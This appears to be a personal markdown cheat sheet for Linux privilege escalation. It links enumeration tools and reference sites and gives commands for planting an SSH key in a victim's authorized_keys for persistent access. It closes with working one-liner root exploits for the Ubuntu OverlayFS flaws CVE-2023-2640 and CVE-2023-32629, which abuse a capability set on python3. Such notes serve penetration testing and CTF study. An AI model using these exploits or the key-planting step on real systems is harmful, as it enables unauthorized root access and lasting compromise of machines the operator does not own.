---
title: Privesc - Linux
---

# Linux Privilege Escalation
## Enum tools
- [Lin Peas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [pspy](https://github.com/DominicBreuker/pspy)
- [Lin Enum](https://github.com/rebootuser/LinEnum)
- [RustScan](https://github.com/RustScan/RustScan)

## Resources
- [gtfobins](https://gtfobins.github.io/gtfobins/ssh/)
- [hacktricks (linux)](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses)
- [hacktricks (windows)](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

## Operations
```bash
sudo -l
```

```bash
bash -p
```

### ssh private key

```bash
# victim
ssh-keygen -t rsa -b 4096
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

# Host
## copy key to host
chmod 600 /path/to/id_rsa_custom
ssh -i /path/to/id_rsa_custom user@target_machine_ip
```

## CVEs

### CVE-2023-2640 | CVE-2023-32629

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
# Or
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\"id\")'"
```
